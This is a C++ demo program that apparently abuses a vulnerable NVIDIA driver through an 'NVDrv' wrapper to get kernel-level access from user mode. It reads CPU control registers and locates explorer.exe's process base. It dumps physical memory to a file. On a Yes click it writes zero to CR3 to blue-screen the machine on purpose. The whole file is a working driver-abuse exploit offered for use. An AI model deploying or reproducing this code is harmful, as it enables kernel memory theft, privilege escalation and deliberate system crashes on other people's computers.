#include <fstream>
#include "NVDrv.h"

void WriteFileToDisk(const char* file_name, const uintptr_t buffer, const DWORD size)
{
	std::ofstream File(file_name, std::ios::binary);
	File.write(reinterpret_cast<char*>(buffer), size);
	File.close();
}

int main()
{
	const auto NV = new NVDrv();
	
	/*
	*	 Read control registers 0 - 4
	* 
	*/

	const DWORD CR0 = NV->ReadCr(NVDrv::NVControlRegisters::CR0);
	printf("CR0: %p\n", reinterpret_cast<void*>(CR0));

	const DWORD CR2 = NV->ReadCr(NVDrv::NVControlRegisters::CR2);
	printf("CR2: %p\n", reinterpret_cast<void*>(CR2));

	const DWORD CR3 = NV->ReadCr(NVDrv::NVControlRegisters::CR3);
	printf("CR3: %p\n", reinterpret_cast<void*>(CR3));

	const DWORD CR4 = NV->ReadCr(NVDrv::NVControlRegisters::CR4);
	printf("CR4: %p\n", reinterpret_cast<void*>(CR4));

	const uintptr_t ProcessBase = NV->GetProcessBase(L"explorer.exe");
	printf("ProcessBase: %p\n", reinterpret_cast<void*>(ProcessBase));

	/*
	*	 Allocate temp memory for the dump
	*
	*/

	constexpr DWORD DumpSize = 0xFFFF;
	const uintptr_t Allocation = reinterpret_cast<uintptr_t>(
		VirtualAlloc(nullptr, DumpSize, MEM_COMMIT, PAGE_READWRITE));


	/*
	*	 Read physical memory onto allocation
	*
	*/

	for (int i = 0; i < (DumpSize / 8); i++)
		NV->ReadPhysicalMemory(i * 8, reinterpret_cast<uintptr_t*>(Allocation + i * 8), 8);


	/*
	*	Write the allocation to disk
	*
	*/

	WriteFileToDisk("PhysicalMemoryDump.bin", Allocation, DumpSize);

	if (Allocation)
		VirtualFree(reinterpret_cast<void*>(Allocation), 0, MEM_RELEASE);

	const int Result = MessageBoxA(nullptr, "BSOD via nulling CR3?", "Test", MB_YESNO);

	/*
	*	 Blue screen via writing 0 to the control register 3
	*
	*/

	if (Result == IDYES)
	{
		if (!NV->WriteCr(NVDrv::NVControlRegisters::CR3, 0))
			printf("WriteCr failed\n");
	}

	/*
	*	Disable KVA shadowing before continuing with this
	* 
	*/


	/*
	auto SystemCR3 = NV->GetSystemCR3();
	printf("SystemCR3: %p\n", (void*)SystemCR3);

	auto ProcessCR3 = NV->GetProcessCR3(ProcessBase);
	printf("ProcessCR3: %p\n", (void*)SystemCR3);
	*/

	Sleep(-1);
}
